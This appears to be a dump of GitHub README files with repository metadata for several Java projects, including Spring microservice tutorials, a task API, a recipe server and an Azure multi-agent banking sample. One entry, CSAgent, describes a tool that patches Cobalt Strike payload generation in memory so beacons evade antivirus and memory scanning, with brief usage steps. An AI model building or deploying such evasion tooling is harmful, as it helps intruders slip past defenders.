<!-- ALL-CONTRIBUTORS-LIST:END -->

<a href=""https://github.com/LnYo-Cly/ai4j/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=LnYo-Cly/ai4j"" />
</a>


# ⭐️ Star History
<a href=""https://star-history.com/#LnYo-Cly/ai4j&Date"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date"" />
 </picture>
</a>",11,1,2,6.0,"['gradle', 'maven', 'rag', 'pr', 'star', 'history']","['gradle', 'maven', 'rag', 'pr', 'star']",3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:versions-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,2.0,1.0
LDAx2012/CSAgent,master,"# CSAgent
  Bypass antivirus software by patching the CS payload in memory through the agent.

  



### WHAT	

​	通过agent修改beacon.BeaconPayload#exportBeaconStage与pe.MalleablePE#process方法来在CS生成payload的过程中去除它的内存特征，使其生成即免杀，并绕过内存查杀。


### HOW
  CodeFile.java中存放了CS中beacon.dll与payload的特征字节与替换字节，CS则是项目源码
​	编译项目，在CS启动参数中添加 -javaagent:CS.jar ，将CodeFile0.java与CodeFile1.java放到同目录下，启动CS，正常生成payload


### ToDo
- 目前仅支持x64，也许会再总结下32位的特征
- 像yara规则一样支持通配符
- 直接写特征太不优雅，写成yara那样的配置文件，支持描述之类的
- 支持动态修改配置等功能
- https TCP DNS等更多测试
",1,0,1,0.0,"['csagent', 'what', 'how', 'todo']","['csagent', 'what', 'how', 'todo']",1.0,[],0.0,1.0,0.0
KirDemorgan/desaAPI,master,"# DesaAPI

DesaAPI is a RESTful API for managing projects, task columns, and tasks. It is built using Java, Spring Boot, and JPA with a Maven build system.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
    - [Projects](#projects)
    - [Task Columns](#task-columns)
    - [Tasks](#tasks)
- [Contributing](#contributing)
- [License](#license)

## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/KirDemorgan/desaAPI.git
    cd desaAPI
    ```

2. Build the project using Maven:
    ```sh
    mvn clean install
    ```

3. Run the application:
    ```sh
    mvn spring-boot:run
    ```

## Usage

The API can be accessed at `http://localhost:8080/api`.

## API Endpoints

### Projects

- **Get all projects**
    ```http
    GET /api/projects
    ```
  **Query Parameters:**
    - `prefix_name` (optional): Filter projects by name prefix.

  **Response:**
    ```json
    [
        {
            ""id"": 1,
            ""name"": ""Project 1"",
            ""taskColumnIds"": [1, 2]
        },
        ...
    ]
    ```

- **Create or update a project**
    ```http
    POST /api/projects
    ```
  **Request Parameters:**
    - `project_id` (optional): ID of the project to update.
    - `project_name` (optional): Name of the project.

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Project 1"",
        ""taskColumnIds"": [1, 2]
    }
    ```

- **Delete a project**
    ```http
    DELETE /api/projects/{projectId}
    ```
  **Path Parameters:**
    - `projectId`: ID of the project to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Project with id 1 deleted successfully""
    }
    ```

### Task Columns

- **Change task column position**
    ```http
    PATCH /api/task_columns/{task_column_id}/position
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column to update.

  **Request Parameters:**
    - `task_column_new_position`: New position of the task column.

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Column 1"",
        ""position"": 2,
        ""tasks"": [...]
    }
    ```

- **Delete a task column**
    ```http
    DELETE /api/task_columns/{task_column_id}
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Task column with id 1 deleted successfully""
    }
    ```

### Tasks

- **Get all tasks in a column**
    ```http
    GET /api/projects/{task_column_id}/tasks
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column.

  **Response:**
    ```json
    [
        {
            ""id"": 1,
            ""name"": ""Task 1"",
            ""description"": ""Description 1"",
            ""taskColumnId"": 1
        },
        ...
    ]
    ```

- **Create a task**
    ```http
    POST /api/projects/{task_column_id}/task
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column.

  **Request Body:**
    ```json
    {
        ""taskName"": ""Task 1"",
        ""optionalTaskDescription"": ""Description 1""
    }
    ```

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Task 1"",
        ""description"": ""Description 1"",
        ""taskColumnId"": 1
    }
    ```

- **Update a task**
    ```http
    PATCH /api/projects/{task_id}/task
    ```
  **Path Parameters:**
    - `task_id`: ID of the task to update.

  **Request Body:**
    ```json
    {
        ""taskName"": ""Updated Task 1"",
        ""optionalTaskDescription"": ""Updated Description 1""
    }
    ```

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Updated Task 1"",
        ""description"": ""Updated Description 1"",
        ""taskColumnId"": 1
    }
    ```

- **Delete a task**
    ```http
    DELETE /api/projects/{task_id}/task
    ```
  **Path Parameters:**
    - `task_id`: ID of the task to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Task with id 1 deleted successfully""
    }
    ```

## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any changes.

## License

This project is licensed under the MIT License.",0,0,2,0.0,"['desaapi', 'table', 'content', 'installation', 'usage', 'api', 'endpoint', 'project', 'task', 'column', 'task', 'contribute', 'license']","['task', 'desaapi', 'table', 'content', 'installation']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
SaiUpadhyayula/spring-boot-3-microservices-course,master,"# Spring Boot Microservices
This repository contains the latest source code of the spring-boot-microservices tutorial

You can watch the tutorial on Youtube [here](https://youtu.be/yn_stY3HCr8?si=EjrBEUl0P-bzSWRG)

## Services Overview

- Product Service
- Order Service
- Inventory Service
- Notification Service
- API Gateway using Spring Cloud Gateway MVC
- Shop Frontend using Angular 18

## Tech Stack

The technologies used in this project are:

- Spring Boot
- Angular
- Mongo DB
- MySQL
- Kafka
- Keycloak
- Test Containers with Wiremock
- Grafana Stack (Prometheus, Grafana, Loki and Tempo)
- API Gateway using Spring Cloud Gateway MVC
- Kubernetes


## Application Architecture
![image](https://github.com/user-attachments/assets/d4ef38bd-8ae5-4cc7-9ac5-7a8e5ec3c969)

## How to run the frontend application

Make sure you have the following installed on your machine:

- Node.js
- NPM
- Angular CLI

Run the following commands to start the frontend application

```shell
cd frontend
npm install
npm run start
```
## How to build the backend services

Run the following command to build and package the backend services into a docker container

```shell
mvn spring-boot:build-image -DdockerPassword=<your-docker-account-password>
```

The above command will build and package the services into a docker container and push it to your docker hub account.

## How to run the backend services

Make sure you have the following installed on your machine:

- Java 21
- Docker
- Kind Cluster - https://kind.sigs.k8s.io/docs/user/quick-start/#installation

### Start Kind Cluster
    
Run the k8s/kind/create-kind-cluster.sh script to create the kind Kubernetes cluster

```shell
./k8s/kind/create-kind-cluster.sh
```
This will create a kind cluster and pre-load all the required docker images into the cluster, this will save you time downloading the images when you deploy the application.

### Deploy the infrastructure

Run the k8s/manisfests/infrastructure.yaml file to deploy the infrastructure

```shell
kubectl apply -f k8s/manifests/infrastructure.yaml
```

### Deploy the services

Run the k8s/manifests/applications.yaml file to deploy the services

```shell
kubectl apply -f k8s/manifests/applications.yaml
```

### Access the API Gateway

To access the API Gateway, you need to port-forward the gateway service to your local machine

```shell
kubectl port-forward svc/gateway-service 9000:9000
```

### Access the Keycloak Admin Console
To access the Keycloak admin console, you need to port-forward the keycloak service to your local machine

```shell
kubectl port-forward svc/keycloak 8080:8080
```

### Access the Grafana Dashboards
To access the Grafana dashboards, you need to port-forward the grafana service to your local machine

```shell
kubectl port-forward svc/grafana 3000:3000
```
",0,2,2,1.0,"['spring', 'boot', 'microservices', 'service', 'overview', 'tech', 'stack', 'application', 'architecture', 'how', 'run', 'frontend', 'application', 'how', 'build', 'backend', 'service', 'how', 'run', 'backend', 'service', 'start', 'kind', 'cluster', 'deploy', 'infrastructure', 'deploy', 'service', 'access', 'api', 'gateway', 'access', 'keycloak', 'admin', 'console', 'access', 'grafana', 'dashboard']","['service', 'how', 'access', 'application', 'run']",6.0,"[org.apache.avro:avro-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,1.0
graalvm/graal-languages-demos,main,"# Graal Languages - Demos and Guides

This repository contains demo applications and guides for [GraalJS](./graaljs), [GraalPy](./graalpy/), [GraalWasm](./graalwasm), and other Graal Languages.
Each demo and guide includes a _README.md_ that explains how to run the application and how it works in more detail.

## Help

If you need help with any of the demos or guides, please [file a GitHub issue](https://github.com/graalvm/graal-languages-demos/issues/new).

## Contributing

This project welcomes contributions from the community. Before submitting a pull request, please [review our contribution guide](./CONTRIBUTING.md).

## Security

Please consult the [security guide](./SECURITY.md) for our responsible security vulnerability disclosure process.

## License

Copyright (c) 2024 Oracle and/or its affiliates.

Released under the Universal Permissive License v1.0 as shown at
<https://oss.oracle.com/licenses/upl/>.
",0,0,1,5.0,"['graal', 'language', 'demo', 'guide', 'help', 'contribute', 'security', 'license']","['graal', 'language', 'demo', 'guide', 'help']",14.0,"[com.github.eirslett:frontend-maven-plugin,io.micronaut.maven:micronaut-maven-plugin,maven-clean-plugin,maven-compiler-plugin,maven-deploy-plugin,maven-install-plugin,maven-jar-plugin,maven-project-info-reports-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-jar-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:wagon-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.graalvm.python:graalpy-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,12.0,0.0
Aimirim-STI/4diac-Plugin-UAORT,main,"# UAORT-4diac-plugin
4diac-ide Plugin to enable deployment on UAO Runtimes

### Install
For a step-by-step tutorial on the plugin instalation please refere to [Install.md](./INSTALL.md) document.

### Usage
To communicate with the UAO Runtime first add an `UAO_RT` device under the ""System Configuration"" view.

Edit the `MGR_ID` entry of the device to match the endpoint and port of the UAO Runtime.

Click on the Device block to select it and then on the `Properties` Tab. Under the `Instance` option select the ""Profile"" as `UAO`.

![Usage Video](./docs/BasicDeploy.gif)

After these steps the communication is configured and you can resume to the 61499 application build.

### Build from sources
Use `maven` tool to build the plugin with:
```shell
$ mvn clean
$ mvn install
```
After the command completes you will find the plugin installable zip file at [./package/target](./package/target) folder.
",2,1,5,0.0,"['install', 'usage', 'build', 'source']","['install', 'usage', 'build', 'source']",6.0,"[org.apache.maven.plugins:maven-dependency-plugin,org.eclipse.tycho:target-platform-configuration,org.eclipse.tycho:tycho-maven-plugin,org.eclipse.tycho:tycho-p2-director-plugin,org.eclipse.tycho:tycho-p2-plugin,org.eclipse.tycho:tycho-p2-repository-plugin,org.eclipse.tycho:tycho-packaging-plugin,org.eclipse.tycho:tycho-source-plugin]",0.0,0.0,1.0
joshlong-attic/2024-bootiful-spring-workshop,main,"
# README 

bit.ly/spring-tips-playlist
youtube.com/@coffeesoftware

## Basics
* which IDE? IntelliJ, VSCode, and Eclipse
* your choice of Java: GraalVM
* start.spring.io, an API, website, and an IDE wizard 
* Devtools
* Docker Compose 
* Testcontainers
* banner.txt

## Development Desk Check
* the Spring JavaFormat Plugin 
	* Python, `gofmt`, your favorite IDE, and 
* the power of environment variables
* SDKMAN
	* `.sdkman`
* direnv 
	*  `.envrc`
* a good password manager for secrets 


## Data Oriented Programming in Java 21+ 
* an example

## Beans
* dependency injection from first principles
* bean configuration
* XML
* stereotype annotations
* lifecycle 
	* BeanPostProcessor
	* BeanFactoryPostProcessor
* auto configuration 
* AOP
* Spring's event publisher
* configuration processor

## AOT & GraalVM
* installing GraalVM 
* GraalVM native images 
* basics
* AOT lifecycles

## Data 
* `JdbcClient`
* SQL Initialization
* Flyway
* Spring Data JDBC

## Batch Processing 
* Spring Batch
* load some data from a CSV file to a SQL database

## Scalability 
* non-blocking IO
* virtual threads
* José Paumard's demo
* Cora Iberkleid's demo 

## Web Programming
* clients: `RestTemplate`, `RestClient`, declarative interface clients
* REST
	* controllers
	* functional style
* GraphQL 
	* batches


## Architecting for Modularity
* Privacy
* Spring Modulith 
* Externalized messages
* Testing 

## Artificial Intelligence
* what's in a model?
* Spring AI
* `ChatClient`
* prompts
* advisors
* Retrieval Augmented Generation (RAG)

## Microservices
* centralized configuration 
* API gateways 
	* reactive or not reactive
* event bus and refreshable configuration
* service registration and discovery



## Messaging and Integration
* ""What do you mean by Event Driven?""
* Messaging Technologies like RabbitMQ or Apache Kafka
* Spring Integration
* files to events


## Security 
* adding form login to an application
* authentication 
* authorization
* passkeys
* one time tokens
* OAuth 
	* the Spring Authorizatinm Server
	* OAuth clients
	* OAuth resource servers
	* protecting messaging code

## Q&A 
* I may not know, but I probably know who does know...",0,0,1,0.0,"['readme', 'basic', 'development', 'desk', 'check', 'data', 'oriented', 'programming', 'java', 'bean', 'aot', 'graalvm', 'data', 'batch', 'processing', 'scalability', 'web', 'program', 'architecting', 'modularity', 'artificial', 'intelligence', 'microservices', 'message', 'integration', 'security', 'q', 'a']","['data', 'readme', 'basic', 'development', 'desk']",19.0,"[io.spring.javaformat:spring-javaformat-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,19.0,0.0
ashokitschool/Microservices_Zero_To_Hero,main,"# Microservices_Zero_To_Hero

## Day-01 : https://youtu.be/f2SdepNqoMo

## Day-02 : https://youtube.com/live/act5MPpiaVM?feature=share

## Day-03 : https://youtu.be/yK1eCuXDrfY

## Day-04 : https://youtu.be/SBPQuQw0lTo
",0,0,1,0.0,"['http', 'http', 'http', 'http']",['http'],7.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,7.0,0.0
FlavorMate/flavormate-server,main,"# FlavorMate

This is the Project for the FlavorMate backend, which is written in Java with Spring Boot.

## Getting Started

### Docker

1. Create a `docker-compose.yaml`-file (or download one from the [examples](./example))
2. Create the folders the container mounts.
3. Create a `secret.key`-file with `openssl rand -hex 64 > secret.key` and copy it into the right folder.
4. Download the [.env.template](./example/.env.template)-file and rename it to `.env`.
5. Enter your details in the `.env`-file
6. Start your container with `docker compose up -d --remove-orphans`

### Barebone

You must have these dependencies installed:

- Postgresql
- Java 21

1. Download the latest [FlavorMate-Server.jar]().
2. Create a `secret.key`-file with `openssl rand -hex 64 > secret.key` and copy it into the right folder.
3. Download the [.env.template](./example/.env.template)-file and rename it to `.env`.
4. Enter your details in the `.env`-file
5. Export your `.env`-file
6. Start the backend with
   ` java -jar -Dspring.profiles.active=release FlavorMate-Server.jar`.

## Environment Variables

| Key                             | Required | Description                                                                                                                     | Example                               | Default                               |
|---------------------------------|----------|---------------------------------------------------------------------------------------------------------------------------------|---------------------------------------|---------------------------------------|
| FLAVORMATE_DATA_PATH            | No       | Path where files (e.g. recipe pictures) are saved                                                                               | `file:${user.home}/.flavormate/files` | `file:${user.home}/.flavormate/files` |
| FLAVORMATE_PORT                 | No       | Port the server runs inside the container                                                                                       | `8095`                                | `8095`                                |
| FLAVORMATE_HIGHLIGHT_COUNT      | No       | Amount of highlights getting generated                                                                                          | `14`                                  | `14`                                  |
| FLAVORMATE_PATH                 | No       | The path the server uses. Useful when hosting frontend and backend on the same url                                              | `/api`                                |                                       |                                     |
| FLAVORMATE_JWT_TOKEN            | No       | The path where the `secret.key`-file is saved                                                                                   | `/opt/app/secret.key`                 | `/opt/app/secret.key`                 |
| FLAVORMATE_BACKEND_URL          | Yes      | The URL the server is running on. Including the port if it is non standard                                                      | `http://localhost:8095`               |                                       |
| FLAVORMATE_FRONTEND_URL         | No       | Is only needed for links inside mails (e.g. password reset). [WebApp](https://github.com/FlavorMate/flavormate-app) is required | `https://app.flavormate.de`           |                                       |
| FLAVORMATE_ADMIN_USERNAME       | Yes      | Username for the admin account                                                                                                  | `admin`                               |                                       |
| FLAVORMATE_ADMIN_DISPLAYNAME    | Yes      | Display name for the admin account                                                                                              | `Administrator`                       |                                       |
| FLAVORMATE_ADMIN_MAIL           | Yes      | Mail address for the admin account                                                                                              | `example@localhost.de`                |                                       |
| FLAVORMATE_ADMIN_PASSWORD       | Yes      | Password for the admin account                                                                                                  | `Passw0rd!`                           |                                       |
| FLAVORMATE_FEATURE_STORY        | No       | Enables the functionality to create and view stories                                                                            | `true`                                | `true`                                |
| FLAVORMATE_FEATURE_REGISTRATION | No       | Allows the user to sign up. An admin has to activate the user.                                                                  | `true`                                | `false`                               |
| FLAVORMATE_FEATURE_RECOVERY     | No       | Allows the user to reset its password. (Mail config is required!)                                                               | `true`                                | `false`                               |
| FLAVORMATE_FEATURE_BRING        | No       | Enabled the bring integration                                                                                                   | `true`                                | `false`                               |
| DB_HOST                         | Yes      | Host address for the postgres database                                                                                          | `localhost:5432`                      |                                       |
| DB_USER                         | Yes      | User for the postgres database                                                                                                  | `flavormate`                          |                                       |
| DB_PASSWORD                     | Yes      | Password for the postgres database                                                                                              | `Passw0rd!`                           |                                       |
| DB_DATABASE                     | Yes      | Database name for the postgres database                                                                                         | `flavormate`                          |                                       |
| MAIL_FROM                       | No       | Mail From header                                                                                                                | `FlavorMate <noreply@example.de>`     |                                       |       
| MAIL_HOST                       | No       | Mail host                                                                                                                       | `smtp.example.com`                    |                                       |
| MAIL_PORT                       | No       | Mail port                                                                                                                       | `465`                                 |                                       |
| MAIL_USERNAME                   | No       | Mail user                                                                                                                       | `noreply@example.com`                 |                                       |
| MAIL_PASSWORD                   | No       | Mail password                                                                                                                   | `Passw0rd!`                           |                                       |
| MAIL_STARTTLS                   | No       | Use StartTLS?                                                                                                                   | `true`                                |                                       |
",2,0,3,5.0,"['flavormate', 'get', 'start', 'docker', 'barebone', 'environment', 'variable']","['flavormate', 'get', 'start', 'docker', 'barebone']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
gufranthakur/CodeLite,master,"# CodeLite

A minimalistic code editor built using Java swing, flatlaf and RSyntaxTextArea. 
This project is meant for learning and experimental purposes, by no means this is a production-ready code editor, but rather a fun attempt to learn and create my own code editor

![Screenshot 2024-10-06 135007](https://github.com/user-attachments/assets/8fe92fed-70f6-4766-939f-de9b4d6775ad)

# Features
* Syntax highlighting
* Auto save
* adding, deleting or renaming files
* open native terminal
* language support for Java, python, C, C++ and Javascript (more to be added soon)
* Dark and light theme
* various color schemes, including Monokai and Eclipse themes.

  # Snapshots

  ![Screenshot 2024-10-06 135111](https://github.com/user-attachments/assets/01ddcdfb-4193-4715-a049-d92649097acf)

  ![Screenshot 2024-10-06 135225](https://github.com/user-attachments/assets/ddd2a519-6f58-4c30-b9c1-1a62ef8ce963)
  
  ![Screenshot 2024-10-06 135324](https://github.com/user-attachments/assets/fdced105-d52d-4cb1-887b-2559fad88b81)
",1,1,1,0.0,"['codelite', 'feature', 'snapshot']","['codelite', 'feature', 'snapshot']",1.0,[],0.0,1.0,0.0
chamithKavinda/Coffee-Shop-POS-JavaEE-Backend,main,"# Caffeine Corner POS - JavaEE Backend
Caffeine Corner is a comprehensive Point of Sale (POS) application designed specifically for coffee shops. It provides an efficient and intuitive system for managing customer interactions,
product inventories, and order transactions. This project serves as an educational resource for mastering Java EE development.

# Project Components
## Front-end
The front-end of Caffeine Corner is crafted to offer a user-friendly interface with seamless interaction.
It utilizes HTML, CSS, jQuery, and Fetch to create a dynamic web application, ensuring a smooth user experience.

## Back-end
The back-end of Caffeine Corner handles server-side operations, data processing, and business logic. 
Implemented using Java EE and hosted on the Apache Tomcat server, it ensures robust performance and reliability for handling transactions and managing data.

### Dashboard View:
![dashboard](https://github.com/user-attachments/assets/c57d1df7-5465-472f-9690-43a8fd220f48)

### Customer Data View:
![Customer](https://github.com/user-attachments/assets/6b8d301c-efa2-4dd2-8046-262706b20ae5)

### Customer Register Form:
![customer add](https://github.com/user-attachments/assets/3d34cffa-a6d6-43ff-a62f-f750a7e04171)

### Customer Data Update Form:
![update customer](https://github.com/user-attachments/assets/abb7aa3c-b8ac-4a7f-a99a-b654649c5433)

### Product Data View:
![product](https://github.com/user-attachments/assets/31dee97a-8c56-4366-9e9e-be7338feec5a)

### Product Add Form:
![add product](https://github.com/user-attachments/assets/2897e147-c3e8-4924-b04b-8a4edb8cc156)

### Product Update Form:
![Update Product](https://github.com/user-attachments/assets/d0c110d8-e4f7-4fbb-879e-e4833bee3573)

### Place Order Form:
![placeOrder](https://github.com/user-attachments/assets/f1d7b6b2-d660-4d2a-80b2-7a73fb0fe813)

# Features

* User-friendly Interface: Designed with an intuitive layout for easy navigation and quick learning. Built using HTML, CSS , JS.
* Reporting and Analytics: Generates detailed reports and alerts on orders, product, and customer data for informed decision-making.
* JavaEE Architecture: Developed with the Java Platform, Enterprise Edition, offering a scalable architecture for enterprise-level applications.
* Apache Tomcat Server: Configured to run on Apache Tomcat, ensuring efficient and reliable web application hosting.
* Data Processing: Implements server-side logic to handle data processing and facilitate seamless communication between the front-end and database.
* Business Rules: Enforces business logic and regulations specific to coffee shop operations.
* Database Interactions: Manages interactions with the database, ensuring data integrity and security.

# Tech Stack
## Front-end:
- HTML
- CSS
- Bootstrap
- jQuery
- Fetch

## Back-end:
- Java EE
- Apache Tomcat

# Database:
* MySQL Connector: Java-based driver for connecting to MySQL databases (Version 8.0.32).
* Java Naming and Directory Interface (JNDI): Java API for connecting to directory services, used for managing database connections efficiently through connection pooling.
 
# Development Tools:
* Maven: Build automation and project management tool (Version 4.0.0)

### Frontend Implementation :
https://github.com/chamithKavinda/Coffee-Shop-POS-System-FrontEnd

# API Endpoint Documentation
* Customer - https://documenter.getpostman.com/view/35385399/2sA3s1oryn
* Product - https://documenter.getpostman.com/view/35385399/2sA3s3FqT2
* Order - https://documenter.getpostman.com/view/35385399/2sA3s3FqT3
* Order Details - https://documenter.getpostman.com/view/35385399/2sA3s3FqT4

",0,0,1,0.0,"['caffeine', 'corner', 'po', 'javaee', 'backend', 'project', 'component', 'dashboard', 'view', 'customer', 'data', 'view', 'customer', 'register', 'form', 'customer', 'data', 'update', 'form', 'product', 'data', 'view', 'product', 'add', 'form', 'product', 'update', 'form', 'place', 'order', 'form', 'feature', 'tech', 'stack', 'database', 'development', 'tool', 'frontend', 'implementation', 'api', 'endpoint', 'documentation']","['form', 'view', 'customer', 'data', 'product']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-war-plugin]",1.0,0.0,0.0
Azure-Samples/agent-openai-java-banking-assistant,main,"---
page_type: sample
languages:
- azdeveloper
- java
- bicep
- typescript
- html
products:
- ai-services 
- azure
- azure-openai
- active-directory
- azure-cognitive-search
- azure-container-apps
- azure-sdks
- github
- document-intelligence
- azure-monitor
- azure-pipelines
urlFragment: agent-openai-java-banking-assistant
name: Multi Agents Banking Assistant with Java and Semantic Kernel
description: A Java sample app emulating a personal banking AI-powered assistant to inquire about account balances, review recent transactions, or initiate payments
---
<!-- YAML front-matter schema: https://review.learn.microsoft.com/en-us/help/contribute/samples/process/onboarding?branch=main#supported-metadata-fields-for-readmemd -->
<!-- prettier-ignore -->
<div align=""center"">

![](./docs/assets/robot-agents-small.png)

# Multi Agents Banking Assistant with Java and Semantic Kernel

[![Open project in GitHub Codespaces](https://img.shields.io/badge/Codespaces-Open-blue?style=flat-square&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Build Status](https://img.shields.io/github/actions/workflow/status/azure-samples/agent-openai-java-banking-assistant/azure-dev.yaml?style=flat-square&label=Build)](https://github.com/azure-samples/agent-openai-java-banking-assistant/actions)
![Java version](https://img.shields.io/badge/Java->=17-3c873a?style=flat-square)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)

<!-- [![Watch how to use this sample on YouTube](https://img.shields.io/badge/YouTube-Watch-d95652.svg?style=flat-square&logo=youtube)]() -->

:star: If you like this sample, star it on GitHub — it helps a lot!

[Overview](#overview) • [Architecture](#agents-concepts-and-architectures) • [Get started](#getting-started) •  [Resources](#resources) • [FAQ](#faq) • [Troubleshooting](#troubleshooting)

![](./docs/assets/ui.gif)
</div>

This project is designed as a Proof of Concept (PoC) to explore the innovative realm of generative AI within the context of multi-agent architectures. By leveraging Java and Microsoft Semantic Kernel AI orchestration framework, our aim is to build a chat web app to demonstrate the feasibility and reliability of using generative AI agents to transform user experience from web clicks to natural language conversations while maximizing reuse of the existing workload data and APIs.



## Overview
The core use case of this Proof of Concept (PoC) revolves around a banking personal assistant designed to revolutionize the way users interact with their bank account information, transaction history, and payment functionalities. Utilizing the power of generative AI within a multi-agent architecture, this assistant aims to provide a seamless, conversational interface through which users can effortlessly access and manage their financial data.

Instead of navigating through traditional web interfaces and menus, users can simply converse with the AI-powered assistant to inquire about their account balances, review recent transactions, or initiate payments. This approach not only enhances user experience by making financial management more intuitive and accessible but also leverages the existing workload data and APIs to ensure a reliable and secure service.

Invoices samples are included in the data folder to make it easy to explore payments feature. The payment agent equipped with OCR tools ( Azure Document Intelligence) will lead the conversation with the user to extract the invoice data and initiate the payment process. Other account fake data as transactions, payment methods and account balance are also available to be queried by the user. All data and services are exposed as external REST APIs and consumed by the agents to provide the user with the requested information.

## Features 
This project provides the following features and technical patterns:
 - Simple multi ai agents Java implementation using *gpt-4o-mini* on Azure Open AI.
 - Chat intent extraction and agent routing.
 - Agents tools configuration and automatic tools invocations with [Java Semantic Kernel](https://github.com/microsoft/semantic-kernel-java/).
 - Tools output cache scoped at chat conversation level.It improves functions call planning and parameters extraction for long chat.
 - Chat based conversation implemented as [React Single Page Application](https://react.fluentui.dev/?path=/docs/concepts-introduction--docs) with support for images upload.Supported images are invoices, receipts, bills jpeg/png files you want your virtual banking assistant to pay on your behalf.
 - Images scanning and data extraction with Azure Document Intelligence using [prebuilt-invoice](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/concept-invoice?view=doc-intel-4.0.0) model.
 - Import REST api contracts (OpenAPI yaml files) as agent tools, providing automatic rest client call. It uses code from Java Semantic Kernel [open-api-plugin code sample](https://github.com/microsoft/semantic-kernel-java/tree/main/samples/semantickernel-sample-plugins/semantickernel-openapi-plugin).
 - Add a copilot app side-by-side to your existing business microservices hosted on [Azure Container Apps](https://azure.microsoft.com/en-us/products/container-apps).
 - Automated Azure resources creation and solution deployment leveraging [Azure Developer CLI](https://learn.microsoft.com/en-us/azure/developer/azure-developer-cli/).

For complex agents conversation implementation, read more about [Autogen framework](https://github.com/microsoft/autogen).

### Architecture
![HLA](docs/assets/HLA.png)
The personal banking assistant is designed as a [vertical multi-agent system](./docs/multi-agents/introduction.md), with each agent specializing in a specific functional domain (e.g., account management, transaction history, payments). The architecture consists of the following key components:

- **Copilot Assistant Copilot App (Microservice)**: Serves as the central hub for processing user requests. It's a spring boot application implementing a vertical multi-agent architectures using Java Semantic Kernel to create Agents equipped with tools. in Java the Agent Router to understand user intent from chat interactions and routes the request to the appropriate domain-specific agent.
    - **Agent Router**: Acts as a user proxy, interpreting user intent based on chat inputs and directing the request to the specific domain agent. This component ensures that user queries are efficiently handled by the relevant agent. It uses **IntentExtractor** tool backed by GPT4 model to extract the user intent in a json format. If intent is 'None' clarifying questions are provided. 

    - **Account Agent**: Specializes in handling tasks related to banking account information, credit balance, and registered payment methods. It leverages specific Account service APIs to fetch and manage account-related data. Semantic Kernel HTTP plugin is used to create a tool definition from the rest api yaml contract (Open API specification) and automatically call the HTTP endpoint with input parameters extracted by gpt4 model from the chat conversation.

    - **Transactions Agent**: Focuses on tasks related to querying user bank movements, including income and outcome payments. This agent accesses account api to retrieve accountid and transaction history service to search for transactions and present them to the user.

    - **Payments Agent**: Dedicated to managing tasks related to submitting payments. It interacts with multiple APIs and tools, such as ScanInvoice (backed by Azure Document Intelligence), Account Service to retrieve account and payment methods info, Payment Service to submit payment processing and Transaction History service to check for previous paid invoices.

- **Existing Business APIs**: Interfaces with the backend systems to perform operations related to personal banking accounts, transactions, and invoice payments. These APIs are implemented as external spring boot microservices providing the necessary data and functionality consumed by agents to execute their tasks.
    - **Account Service (Microservice)**: Provides functionalities like retrieving account details by username, fetching payment methods, and getting registered beneficiaries. This microservice supports all 3 agents.

    - **Payments Service (Microservice)**: Offers capabilities to submit payments and notify transactions. It is a critical component for the Payments Agent to execute payment-related tasks efficiently.

    - **Reporting Service (Microservice)**: Enables searching transactions and retrieving transactions by recipient. This service supports the Transactions Agent in providing detailed transaction reports to the user and the Payment Agent as it needs to check if an invoice has not been already paid.

## Getting Started

### Run in GitHub Codespaces or VS Code Dev Containers

You can run this repo virtually by using GitHub Codespaces or VS Code Dev Containers.  Click on one of the buttons below to open this repo in one of those options.

[![Open in GitHub Codespaces](https://img.shields.io/static/v1?style=for-the-badge&label=GitHub+Codespaces&message=Open&color=brightgreen&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Open in VS Code Dev Containers](https://img.shields.io/static/v1?style=for-the-badge&label=Remote%20-%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/azure-samples/agent-openai-java-banking-assistant/)

